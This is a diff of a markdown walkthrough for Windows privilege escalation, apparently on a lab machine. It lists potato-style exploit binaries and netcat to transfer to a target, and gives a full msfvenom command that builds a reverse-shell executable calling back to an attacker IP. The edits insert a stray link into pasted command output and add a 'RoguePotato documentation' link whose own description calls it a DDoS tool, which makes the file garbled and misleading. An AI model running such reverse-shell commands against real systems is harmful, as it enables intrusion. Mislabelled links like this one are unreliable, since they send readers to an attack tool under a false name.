@@ -38,7 +38,7 @@ From the above scenarion there many ways you can try to exploit this but actuall
 
 ## first thing were gonna need is transfering the following binaries into our target machine 
 1. nc.exe (specific for windows) [[nc.exe]]
-2. RoguePotato.exe[[RoguePotato.md]]
+2. RoguePotato.exe 
 3. JuicyPotato
 4. payload with msfvenom specific for windows(msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe)
 5. PrintSpoofer
@@ -61,7 +61,8 @@ dir
 04/13/2024  08:39 AM            27,136 spoofer.exe
 02/20/2020  03:14 AM             1,191 TeamViewer 7.lnk
                7 File(s)        601,801 bytes
-               3 Dir(s)  13,362,515,968 bytes free
+
+[[RoguePotato.md]]         3 Dir(s)  13,362,515,968 bytes free
 ```
 Everything required is available here no need to search for them online anymore, just this repostory is enough to go for root/administrator
 
@@ -83,3 +84,5 @@ The following are the references i have used to create everything here
 
 ```
 
+## <a name="RoguePotato documentation"> </a>RoguePotato documentation
+- [RoguePotato.md](https://github.com/alien-keric/DDOS-TOOL) - 🖥️ A  ddos tool made with simple script written in python . **By [@alien-keric](https://github.com/alien-keric)**
